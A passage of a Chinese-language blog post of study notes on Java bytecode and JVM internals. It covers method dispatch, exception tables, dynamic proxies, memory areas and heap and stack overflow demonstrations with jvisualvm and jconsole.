      stack=2, locals=2, args_size=2
         0: aload_0
         1: iload_1
         2: putfield      #4                  // Field x:I
         5: return
      LineNumberTable:
        line 13: 0
        line 14: 5
      LocalVariableTable:
        Start  Length  Slot  Name   Signature
            0       6     0  this   Lcom/erwa/bytecode/MyTest2;
            0       6     1     x   I

  static {};
    descriptor: ()V
    flags: ACC_STATIC
    Code:
      stack=1, locals=0, args_size=0
         0: bipush        10
         2: invokestatic  #8                  // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;
         5: putstatic     #9                  // Field in:Ljava/lang/Integer;
         8: return
      LineNumberTable:
        line 6: 0
}
SourceFile: &quot;MyTest2.java&quot;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;加上synchronized关键字字节码&quot;&gt;加上synchronized关键字字节码&lt;/h4&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;为什么除了访问权限多了synchronized之外，其他的地方都一样。&lt;/p&gt;
&lt;p&gt;因为synchronized使用的方式有多种：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;如果synchronized用在实例方法上，表示对此方法加了一个锁。&lt;/li&gt;
&lt;li&gt;如果用在了对象上，则字节码会生成锁的入口和出口。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;synchronized用在类中的静态方法上， 其实是给当前的类的对象上的锁。&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;关于锁：能不用synchronized就不用。使用轻量级的 lock 。&lt;/p&gt;
&lt;h4 id=&quot;构造方法和静态代码块字节码&quot;&gt;构造方法和静态代码块字节码&lt;/h4&gt;
&lt;blockquote&gt;
&lt;ol&gt;&lt;li&gt;如果没有设置构造方法，会默认生成一个无参构造。如果有静态方法，会初始化一个clinit的方法。&lt;/li&gt;
&lt;li&gt;全局变量是在构造方法初始化的时候完成赋值的。&lt;/li&gt;
&lt;li&gt;一个构造方法对应一个init方法。（全局变量的赋值，会在每个init方法中都重新执行一次）&lt;/li&gt;
&lt;li&gt;所有的静态变量和静态代码块赋值都是在clinit中执行的。&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;字节码对this关键字和异常的处理&quot;&gt;字节码对this关键字和异常的处理&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**   -=this关键字的总结=-
    对于Java类中的每一个实例方法（非static方法），其在编译后所生成的字节码当中，方法参数的数量总会比源代码方法中的参数量多一个（this）,它位于方法的第一个参数位置处，这样我们就可以在Java的实例方法中使用this来访问当前对象的属性以及其他方法。
    这个操作是在编译期间完成的。由Javac编译器在编译的时候将对this的访问转化成对一个普通实例方法参数的访问；接下来的运行期间，由JVM在调用实例方法时，自动向实例方法传入该this参数。所以在实例方法的局部变量中，至少会有一个指向当前对象的局部变量。
*/

/**  -=Java字节码对于异常的处理方式：=-
    1. 统一采用异常表的方式来对异常进行出来的。
    2. 在jdk1.4.2之前的版本中，并不是使用异常表的方式来对异常进行处理的，而是采用特定的指令方式进行处理的。
    3. 当异常处理存在finally语句块时，现代化的JVM才去的处理方式是将finally语句块的字节码拼接到每一个catch块后边，换句话说，程序中存在多少个catch块，就会在每一个catch块后面重复多少个finally语句块的字节码。
*/
public class MyTest3 {
    public void test(){
        try{
            FileInputStream fileInputStream = new FileInputStream(&quot;t.txt&quot;);

            ServerSocket serverSocket = new ServerSocket(9999);
            serverSocket.accept();
        }catch(FileNotFoundException exc){

        }catch(IOException ex){

        }catch(Exception e){

        }finally {
            System.out.println(&quot;exception&quot;);
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;test()中的Code中三个参数的说明：&lt;/p&gt;
&lt;p&gt;stack=3 ;&quot;最大栈深度&quot; （对于方法栈，压栈弹出。）&lt;/p&gt;
&lt;p&gt;locals =4 ; &quot;成员变量的个数&quot; (局部变量有： this，is ,serverSocket , ex (同时只能有一个异常的参数))&lt;/p&gt;
&lt;p&gt;agrs_size=1 &quot;参数的个数“（第一个默认的都是this）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbvjgna1mqj31ey0eaqil.jpg&quot; alt=&quot;image-20200214064208939&quot;/&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbvjhdub36j31f00cgtk2.jpg&quot; alt=&quot;image-20200214064251773&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbvji9mxgyj31fa0qwe81.jpg&quot; alt=&quot;image-20200214064341107&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;linenumbertable-是-字节码和源代码对应的行号&quot;&gt;LineNumberTable 是 字节码和源代码对应的行号&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbvk669ov9j31r20u0gw9.jpg&quot; alt=&quot;image-20200214070640848&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;localvariabletabel-是-对于局部变量的存储信息&quot;&gt;LocalVariableTabel 是 对于局部变量的存储信息&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbvk75xivoj31sw0u0tj3.jpg&quot; alt=&quot;image-20200214070737725&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;stackmaptable-是针对于安全的&quot;&gt;StackMapTable 是针对于安全的。&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbvjmsjjaoj31bc0o4afy.jpg&quot; alt=&quot;image-20200214064803780&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;bytecode内容&quot;&gt;ByteCode内容：&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbvjsg87hkj31c00u0npd.jpg&quot; alt=&quot;image-20200214065328559&quot;/&gt;&lt;/p&gt;
&lt;p&gt;goto 语句是发生异常的时候进行跳转到catch的位置。&lt;/p&gt;
&lt;h5 id=&quot;exception-table-信息&quot;&gt;Exception table 信息：&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbvju7fl7kj31c00u0e81.jpg&quot; alt=&quot;image-20200214065509512&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后的一个any来说，是处理所有上边不可能处理的异常。是字节码生成的时候帮助我们生成的。&lt;/p&gt;
&lt;h3 id=&quot;字节码的运行机制&quot;&gt;字节码的运行机制&lt;/h3&gt;
&lt;h3 id=&quot;字节码基础概念&quot;&gt;字节码基础概念&lt;/h3&gt;
&lt;h4 id=&quot;栈帧stack-frame&quot;&gt;栈帧（stack frame）&lt;/h4&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;ol&gt;&lt;li&gt;栈帧是由栈和帧组合而成的概念。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;栈帧一种用于帮助虚拟机执行方法调用与方法执行的数据结构。他是独立于线程的，一个线程有自己的一个栈帧。不存在并发的情况。&lt;/p&gt;
&lt;p&gt;栈帧本是一种数据结构，封装了方法的局部变量表、动态链接信息、方法的返回地址以及操作数栈等信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;21&quot;&gt;
&lt;ol&gt;&lt;li&gt;java中的引入的概念：符号引用：直接引用。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;有些符号引用是在类加载阶段或是第一次使用时就会转换成直接引用，这种转换叫做静态解析；&lt;/p&gt;
&lt;p&gt;另外一些符号引用则是在每次运行期转换为直接引用，这种转换叫做动态链接，这种体检为Java的多态性。&lt;/p&gt;
&lt;p&gt;如： Animal a = new Cat();&lt;/p&gt;
&lt;p&gt;a.sleep(); //实际上应该调用Cat()的sleep();&lt;/p&gt;
&lt;p&gt;a = new Dog();&lt;/p&gt;
&lt;p&gt;a.sleep(); //实际上应该调用Dog()的sleep();&lt;/p&gt;
&lt;p&gt;a = new Tiger();&lt;/p&gt;
&lt;p&gt;a.sleep(); //实际上应该调用Tiger()的sleep();&lt;/p&gt;
&lt;p&gt;但是在程序编译的时候，字节码能看到的是 a调用的都是Animal的sleep();&lt;/p&gt;
&lt;p&gt;应用了invokevirtual的概念。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;入栈出栈&quot;&gt;入栈，出栈&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbvkksqi8cj31b70u0k46.jpg&quot; alt=&quot;image-20200214072043992&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;结合上图，我用文字描述一下两个概念。看自己能否理解。&lt;/p&gt;
&lt;p&gt;首先将2和3压入栈中。现在要做一个减法，3-2 。 需要先把2从栈中取出，3也从栈中取出，做完减法后，把1压入栈中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;局部变量表的概念slot&quot;&gt;局部变量表的概念(slot)&lt;/h5&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//slot  为栈帧中的一个个小格，上图中的一个三角区域。  
public void test(){
    int a = 3;
    if (a&amp;lt;4){
      int b = 4;
      int c = 5;
    }
    int d = 7;
  }
// slot是可以复用的。方法体中声明的局部变量。
// 因为方法体本身又可以存在更小的作用域。
// 所以一个方法中有10个变量，可能使用7个8个slot，也可能使用10个slot。&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;invoke-的概念调用&quot;&gt;invoke 的概念（调用）&lt;/h5&gt;
&lt;blockquote&gt;
&lt;ol&gt;&lt;li&gt;invokeinterface : 调用接口中的方法，实际上是在运行期决定的，决定到底调用实现该接口的哪个对象的特定方法。&lt;/li&gt;
&lt;li&gt;invokestatic : 调用静态方法。&lt;/li&gt;
&lt;li&gt;invokespecial : 调用自己的私有方法、构造方法（）以及父类的方法。&lt;/li&gt;
&lt;li&gt;invokevirtual : 调用虚方法、运行期动态查找的过程。&lt;/li&gt;
&lt;li&gt;Invokedynamic: 动态调用方法。&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
静态解析的4种情形： （字节码还没有运行的时候，就已经能够确定调用哪个方法）

1. 静态方法
2. 父类方法
3. 构造方法
4. 私有方法（无法被重写）

以上4类方法称为非虚方法，他们是在类加载阶段就可以将符号引用转换成直接引用。

*/
public class MyTest4{
  public static void test(){
    sout();
  }
  public static void main(String[] args){
    test();
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;方法重载方法的静态分派机制&quot;&gt;方法重载（方法的静态分派机制）&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**  方法的静态分派
 Grandpa g1 = new Father(); G1的静态类型是Grandpa，而g1的实际类型（真正指向的类型）是Father。
 我们可以得到这样一个结论：变量的静态类型是不会发生变化的，而变量的实例类型是可以发生变化的（多态的一种实现），实例类型是在运行期方可确定。
*/
public class MyTest5{
    // 方法重载，是一种静态的行为，编译器就可以完全确定。
    public void test(Grandpa grandpa){
        System.out.println(&quot;Grandpa&quot;);
    }
    public void test(Father father){
        System.out.println(&quot;Father&quot;);
    }
    public void test(Son son){
        System.out.println(&quot;Son&quot;);
    }
    public static void main(String[] args){
        Grandpa g1 = new Father();
        Grandpa g2 = new Son();

        MyTest5 mytest5 = new MyTest5();
        mytest5.test(g1); // 实例调用的时候，获取到的参数的类型是获取到实例的静态类型。所有都是Grandpa
        mytest5.test(g2);
    }

}
class Grandpa{}
class Father extends Grandpa{}
class Son extends Father{}

&amp;gt; Task :MyTest5.main()
Grandpa
Grandpa&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbvlq5ex9hj31c00u0hdt.jpg&quot; alt=&quot;image-20200214080027838&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;方法重写方法的动态分派机制&quot;&gt;方法重写（方法的动态分派机制）&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**  方法的动态分派
    方法的动态分派涉及到一个重要概念：方法接受者。
    invokevirtual字节码指令的多态查找流程。
    流程： 找到操作数栈顶的第一个元素，对象引用的实际类型。

    比较方法重载（overload）与方法重写（overwrite），我们可以得到这样一个结论：
    方法重载是静态的，是编译期行为；方法重写是动态的，是运行期行为。
*/
public class MyTest6{
  psvm(){
    Fruit apple = new Apple();
    Fruit orange = new Orange();
    
    apple.test();
    orange.test();
    
    apple = new Orange();
    apple.test();
  }
}

class Fruit(){
  public void test(){
    sout(&quot;fruit&quot;);
  }
}
class Apple extends Fruit(){
  @Override
  public void test(){
    sout(&quot;Apple&quot;);
  }
}
class Orange extends Fruit(){
  @Override
  public void test(){
    sout(&quot;Orange&quot;);
  }
}

输出结果为：
  apple 
  orange 
  orange &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;new 关键字的作用: 1、开辟一个内存空间，2、调用构造方法 3、赋值给局部变量&lt;/p&gt;
&lt;h4 id=&quot;虚方法表与动态分派机制详解&quot;&gt;虚方法表与动态分派机制详解&lt;/h4&gt;
&lt;blockquote readability=&quot;12&quot;&gt;
&lt;p&gt;针对于方法调用动态分派的过程，虚拟机会在类的方法区建立一个虚方法表的数据结构。（virtual method table ,简称 vtable），是在加载连接阶段完成的加载。&lt;/p&gt;
&lt;p&gt;针对于invokeinterface指令来说，虚拟机会建立一个叫做接口范发表的数据结构。（interface method table , 简称itable）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbw91wy8o2j31jf0u0npd.jpg&quot; alt=&quot;image-20200214212732468&quot;/&gt;&lt;/p&gt;
&lt;p&gt;输出结果：&lt;/p&gt;
&lt;p&gt;animal str&lt;/p&gt;
&lt;p&gt;Dog date&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbw9a6begej31gu0u0dy0.jpg&quot; alt=&quot;image-20200214213530201&quot;/&gt;&lt;/p&gt;
&lt;p&gt;子类和父类的相同的方法 元素的索引号是一样的。这样会提高性能和效率。&lt;/p&gt;
&lt;h5 id=&quot;基于栈的指令集与基于寄存器的指令集详细对比&quot;&gt;基于栈的指令集与基于寄存器的指令集详细对比&lt;/h5&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
现代JVM在执行Java代码的时候，通常都会将解释执行与编译执行结合起来进行。

所谓解释执行，就是通过解释器来读取字节码，遇到相应的指令就去执行指令。
所谓编译执行，就是通过即时编译器（Just In Time ,JIT）将字节码转换成本地机器执行；现在的JVM会根据代码热点来生成。

基于栈的指令集与基于寄存器的指令集之间的关系：
1. JVM执行指令时所采取的的方式是基于栈的指令集。
2. 基于栈的指令集主要的操作有入栈与出栈两种。
3. 基于栈的指令集的优势在于它可以在不同平台之间移植，而基于寄存器的指令集与操作系统结构紧密关联，无法做到可移植性。
4. 基于栈的指令集的缺点在于完成相同的操作，指令数量通常要比基于寄存器的指令集数量要多；基于栈的指令集是在内存中完成操作的，而基于寄存器的指令集是直接由CPU来执行的，它是在高速缓存区中进行执行的，速度要快很多。虽然虚拟机可以采用一些优化手段，但总体来说，基于栈的指令集的执行速度要慢一些。
*/

举例： 2-1：  在栈中的指令 与 在寄存器中的指令。
栈的指令： 
  1.iconst_1  （将数字1 压入栈）
  2.iconst_2  （将数字2 压入栈）
  3.isub   (将栈顶的两个元素弹出，执行减法操作，然后将结果压入栈顶)
  4.istore  （取出栈顶的数据）
寄存器的指令： 
  1.将2放入到一个寄存器中。
  2.调用减法的指令，后边跟一个参数。然后将结果放入到这个寄存器中。
  
// JVM执行指令时所采取的的方式是基于栈的指令集。举例： 
public class MyTest8{
  public int mCalculate(){
    int a = 1;
    int b = 2;
    int c = 3;
    int d = 4;
    int result = (a+b+c)*D;
    return result;
  }
 
编译上方代码，然后反编译class文件。以字节码的方式查看此运算的过程
  
  iconst_&amp;lt;i&amp;gt;:将int常量推送到操作数栈当中。（i = 0, 1 ,2 ,3 ,4 ,5 ）； i 为栈中的索引；
  istore_&amp;lt;i&amp;gt;:将操作数栈顶的元素弹出。（i = 1 , 2 , 3）
  istore 4 : (istore 的值最大到3)
  iload_&amp;lt;i&amp;gt;:从局部变量中加载一个值。（i = 0 ,1 , 2 , 3 ）
  iload 4 : (iload 的 i的最大值为3 )
  iadd: 完成整形的加法。（从操作栈中弹出两个值进行相加，然后把值压入栈顶）
  isub: 完成数组的减法。（从操作栈中弹出两个值进行相减，然后把值压入栈顶）
  imul: 完成整数的乘法。（从操作栈中弹出两个值进行相乘，然后把值压入栈顶）&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;透过字节码生成审视java动态代理运作机制&quot;&gt;透过字节码生成审视Java动态代理运作机制&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//动态代理类的实现。
//动态代理的优势：在真实对象还不存在的情况下就可以把代理对象创建出来，代理对象可以代理多种真实对象。比如说Spring中的APO，我们面面向接口编程的时，通过动态代理给我们生成实例。还有SPring继承的CJLib  
public interface Subject {
    public void  request();
}

public class RealSubject implements Subject {
    @Override
    public void request() {
        System.out.println(&quot;From real subject&quot;);
    }
}
    
public class DynamicSubject implements InvocationHandler {
    private Object sub;
    public DynamicSubject(Object object) {
        this.sub = object;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println(&quot;before calling: &quot; + method);
        method.invoke(this.sub, args);
        System.out.println(&quot;after calling: &quot; + method);
        return null;
    }
}

public class Client {
    public static void main(String[] args) {
        System.getProperties().put(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;);
        RealSubject rs = new RealSubject();
        DynamicSubject ds = new DynamicSubject(rs);
        Class&amp;lt;? extends RealSubject&amp;gt; cls = rs.getClass();
        Subject subject = (Subject) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), cls.getInterfaces(), ds);// 属性文件的设置，是从这个里边找到的。 
        subject.request(); // 真正指向的实例是 $Proxy 
        System.out.println(subject.getClass());
        System.out.println(subject.getClass().getSuperclass());
    }
}

&amp;gt; Task :Client.main()
before calling: public abstract void com.erwa.bytecode.Subject.request()
From real subject
after calling: public abstract void com.erwa.bytecode.Subject.request()
class com.sun.proxy.$Proxy0
class java.lang.reflect.Proxy
  
  并且生成了一个$Proxy0文件的class文件： 如下&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//
// 如果使用了动态代理，除了eques toString hashCode  的其他方法。并不受动态代理的影响。
An invocation of the hashCode, equals, or toString methods declared in java.lang.Object on a proxy instance will be encoded and dispatched to the invocation handlers invoke method in the same manner as interface method invocations are encoded and dispatched, as described above. The declaring class of the Method object passed to invoke will be java.lang.Object. Other public methods of a proxy instance inherited from java.lang.Object are not overridden by a proxy class, so invocations of those methods behave like they do for instances of java.lang.Object.
'如上所述，将对代理实例上java.lang.Object中声明的hashCode，equals或toString方法的调用进行编码，并将其分派到调用处理程序invoke方法，方法与对接口方法调用进行编码和分派的方式相同，如上所述。传递给调用的Method对象的声明类将是java.lang.Object。从java.lang.Object继承的代理实例的其他公共方法不会被代理类覆盖，因此对这些方法的调用的行为就像对java.lang.Object实例的调用一样。'
  
package com.sun.proxy;

import com.erwa.bytecode.Subject;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.lang.reflect.UndeclaredThrowableException;

public final class $Proxy0 extends Proxy implements Subject {
    private static Method m1;
    private static Method m2;
    private static Method m3;
    private static Method m0;

    public $Proxy0(InvocationHandler var1) throws  { // 只有这一个构造方法
        super(var1);
    }

    public final boolean equals(Object var1) throws  {
        try {
            return (Boolean)super.h.invoke(this, m1, new Object[]{var1});
        } catch (RuntimeException | Error var3) {
            throw var3;
        } catch (Throwable var4) {
            throw new UndeclaredThrowableException(var4);
        }
    }

    public final String toString() throws  {
        try {
            return (String)super.h.invoke(this, m2, (Object[])null);
        } catch (RuntimeException | Error var2) {
            throw var2;
        } catch (Throwable var3) {
            throw new UndeclaredThrowableException(var3);
        }
    }

    public final void request() throws  {  // 我们自己要求被代理的方法。
        try {
            super.h.invoke(this, m3, (Object[])null);
        } catch (RuntimeException | Error var2) {
            throw var2;
        } catch (Throwable var3) {
            throw new UndeclaredThrowableException(var3);
        }
    }

    public final int hashCode() throws  {
        try {
            return (Integer)super.h.invoke(this, m0, (Object[])null);
        } catch (RuntimeException | Error var2) {
            throw var2;
        } catch (Throwable var3) {
            throw new UndeclaredThrowableException(var3);
        }
    }

    static {  // 
        try {
            m1 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;equals&quot;, Class.forName(&quot;java.lang.Object&quot;));
            m2 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;toString&quot;);
            m3 = Class.forName(&quot;com.erwa.bytecode.Subject&quot;).getMethod(&quot;request&quot;);
            m0 = Class.forName(&quot;java.lang.Object&quot;).getMethod(&quot;hashCode&quot;);
        } catch (NoSuchMethodException var2) {
            throw new NoSuchMethodError(var2.getMessage());
        } catch (ClassNotFoundException var3) {
            throw new NoClassDefFoundError(var3.getMessage());
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;java字节码总结&quot;&gt;java字节码总结&lt;/h3&gt;
&lt;p&gt;不要把源代码和字节码混为一谈，他们没有相关的对应关系。&lt;/p&gt;
&lt;p&gt;2020年02月15日23:00:50 。 回顾完毕。晚安。&lt;/p&gt;
&lt;h2 id=&quot;jvm内存&quot;&gt;JVM内存&lt;/h2&gt;
&lt;h3 id=&quot;jvm内存空间划分与作用&quot;&gt;JVM内存空间划分与作用&lt;/h3&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**  JVM的内存空间划分介绍与堆空间的用途分析：（以下7个空间）
 1. 虚拟机栈（栈帧）：每一个方法都会生成 Stack Frame 栈帧。属于线程私有的一份空间（伴随着线程的存在而存在）。内含局部变量表，用来存放方法的局部变量。虚拟机栈可能会抛出堆栈溢出错误。
 2. 程序计数器（Program Counter）：是一块很小的内存空间，主要的作用用来区分当前执行线程的行号与顺序。本身与虚拟机栈类似，是属于线程私有的数据结构。在多线程的环境下，多核，每一个核心也最多执行一个线程，但是可以有多个线程相互切换着执行，此时就需要程序计数器来记录线程执行的行号来区分维护。（它是一定不会出现栈溢出的情况）
 3. 本地方法栈：主要用于处理本地方法（native方法，由其他语言写的方法）； Oracle的虚拟机把虚拟机栈和本地方法栈合二为一了。
 4. 堆（Heap）（重点研究）：JVM中最大的一块内存，是一块共享区域（被Java所有的线层所共享的，几乎所有的对象都是在堆上进行分配的），用于存放对象实例。我们一般通过引用来操作对象，而不是直接操作对象。对象引用位于栈当中。堆中发生垃圾回收的概率是最高的。方法区是极少出现垃圾回收的可能。与堆相关的一个重要概念就是垃圾收集器（现在所有的收集器都是采用的分代收集算法，所以堆空间也基于这一点进行了相应的划分：新生代，老年代；Eden空间，From Survivor空间与To Survivor空间）。Java的堆空间在物理上既可以是连续的，也可以是不连续的。
 5. 方法区（Method Area）：存储元信息。永久代（Permanent Generation）从JDK1.8之后就被废弃了，使用元空间（meta space）来替代。
 6. 运行时的常量池：方法区中的一部分内容。
 7. 直接内存（Direct Memory）：堆外内存（并不是由虚拟机直接管理的内存，在Java虚拟机外开辟的一片空间），与Java NIO密切相关。JVM通过堆上的DirectByteBuffer来操作直接内存。
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;12&quot;&gt;
&lt;p&gt;引用指向的对象并不是目标本身，而是一个指针指向对象的实例数据,另一个指针指向方法区中的类型数据（元数据）。如图 所示。Oracle的JVM采用下方的引用方式（使用直接指针的方式）。&lt;/p&gt;
&lt;p&gt;使用句柄的好处（引用永远指向他，引用不会跟着修改）&lt;/p&gt;
&lt;p&gt;直接指针的好处（在压缩的时候效率比句柄的方式更高）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbxt97optij319p0u0b29.jpg&quot; alt=&quot;image-20200216055201640&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;java对象内存分配原理与布局&quot;&gt;Java对象内存分配原理与布局&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
    关于Java对象创建的过程：
    
    new 关键字创建对象的3个步骤：
    1. 在堆内存中创建出对象的实例。
    2. 为对象的实例成员变量赋初值。（调用init方法，进行初始化）
    3. 将对象的引用返回。（将结果返回给栈帧）
    
    对象存储的两种方式（出现两种情况的原因与垃圾收集器密不可分）：
    1. 指针碰撞：（前提是堆中的空间通过一个指针进行分割，一侧是已经被占用的空间，另一侧是未被占用的空间）
    2. 空闲列表：（前提是堆内存空间中已被使用与未被使用的空间是交织在一起的，这时虚拟机就需要通过一个列表来记录哪些空间是已被使用的，哪些空间是未被使用的，接下来找出可以容纳下新创建对象的且未被使用的空间，在此空间存放该对象，同时还要修改列表上的记录）
    
    对象在内存中的布局：
    1. 对象头
    2. 实例数据（即我们在一个类中所声明的各项信息，成员变量的信息）
    3. 对齐填充（可选）
    
    引用访问对象的方式：
    1. 使用句柄的方式。
        好处：（引用永远指向他，引用不会跟着修改）
    2. 使用直接指针的方式。（Oracle的JVM使用的方式）
        好处：（在压缩的时候效率比句柄的方式更高）
*/&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;堆溢出栈溢出方法区溢出实例练习&quot;&gt;堆溢出、栈溢出、方法区溢出实例练习&lt;/h4&gt;
&lt;h5 id=&quot;堆溢出举例实战jvisualvm&quot;&gt;堆溢出举例，实战jvisualvm&lt;/h5&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 堆溢出举例 （CPU会起飞）
public class MyTest1{
  psvm{
    List&amp;lt;MyTest1&amp;gt; list = new ArrayList();
    for( ; ; ){
      list.add(new MyTest());
      
   //   System.gc(); // 不建议日常开发中使用。垃圾回收：运行垃圾回收器。虚拟机去尝试回收不再使用的对象。此时就不会报错了，正是由于这一行代码起作用，进行垃圾收集了。
    }
  }
}
// 在 vm options中添加参数：  -Xms5m -Xmx5m -XX:+HeapDumpOnOutOfMemoryError  
// 设置堆内存为5M ,打印出堆溢出的转储文件&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbxv3drldmj31zk0fknnc.jpg&quot; alt=&quot;image-20200216065542670&quot;/&gt;&lt;/p&gt;
&lt;p&gt;对应的JVM的运行信息：类，实例数等信息都可以在这里通过工具查看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbxv9llkuoj319c0u07wh.jpg&quot; alt=&quot;截屏2020-02-16上午7.01.28&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我这里jdk8带的jvisualvm打不开，没有跟着练习看一下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbxxq8nno6j317k042wgy.jpg&quot; alt=&quot;image-20200216082653541&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbxvaegk5lj31gu0a8wpz.jpg&quot; alt=&quot;image-20200216070228154&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;线程栈溢出监控与jconsole-工具使用介绍&quot;&gt;线程栈溢出监控与Jconsole 工具使用介绍&lt;/h5&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
    虚拟机栈溢出 举例：使用递归，可能导致栈溢出。

*/

public class MyTest2 {
    private int length;  //记录一共调用了多少层。
    public void setLength(int length) {
        this.length = length;
    }
    public int getLength() {
        return length;
    }
    public void test(){
        this.length ++;
        test();
    }
    public static void main(String[] args) {
        MyTest2 myTest2 = new MyTest2();
        try{
            myTest2.test();
        }catch(Throwable ex ){
            System.out.println(myTest2.length);
            ex.printStackTrace();
        }
    }
}
// 在 vm options中添加参数：  -Xss160k  // 设置栈的大小为160k（JVM虚拟机要求的最小栈内存为160k）
运行结果如下图。    &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby06udx0yj31ou0dy781.jpg&quot; alt=&quot;image-20200216095202893&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby06fy664j31wm0i878w.jpg&quot; alt=&quot;image-20200216095139957&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Jvisualvm 监控栈溢出过程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby0axg8ssj31d60u0b2b.jpg&quot; alt=&quot;image-20200216095554940&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Jconsole 工具 监控。 也是Oracle自带的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gby0lg6v3tj31000u0tfl.jpg&quot; alt=&quot;image-20200216100604706&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;线程死锁检测与分析工具深度学习&quot;&gt;线程死锁检测与分析工具深度学习&lt;/h5&gt;
&lt;pre class=&quot;java&quot;&gt;
